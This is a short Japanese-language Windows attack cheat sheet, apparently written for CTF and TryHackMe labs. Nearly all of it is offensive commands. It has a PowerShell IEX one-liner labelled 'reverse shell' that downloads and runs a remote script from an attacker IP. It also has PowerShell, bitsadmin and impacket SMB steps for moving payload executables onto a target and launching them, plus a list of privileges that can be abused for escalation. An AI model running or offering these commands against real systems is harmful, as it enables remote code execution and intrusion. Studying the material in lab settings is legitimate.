# Windows

### reverse shell
```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.180/hogehoge.ps1')"
```

### fileの発見
`dir flag* /s /p`

### スクリプト実行
`.\filename`

### fileをDL
https://binary-pulsar.hatenablog.jp/entry/2018/11/28/090000

```
bitsadmin /transfer download https://www.google.co.jp/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png %CD%\logo.png
```

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.27.249:8000/sheshe.exe','sheshe.exe')"
```

#### smb使うパターン
on Kali

```
kali@kali:~$ sudo python /home/kali/impacket/examples/smbserver.py share .
```

on target 

```
c:\ > copy \\10.10.14.8\share\pr.exe  c:\windows\temp
```

### powershellでプロセス実行
`powershell "Start-Process "sheshe.exe""`

### serviceのリスタート
```
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

### 現在のユーザーの権限一覧
`whoami /priv`
特権に関しては[こちら](https://www.exploit-db.com/papers/42556)参照
特権使ったTryHackMeは[これ](https://qiita.com/sanpo_shiho/items/3f2c4595f20cd4133ab8)

#### 怪しい特権
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege
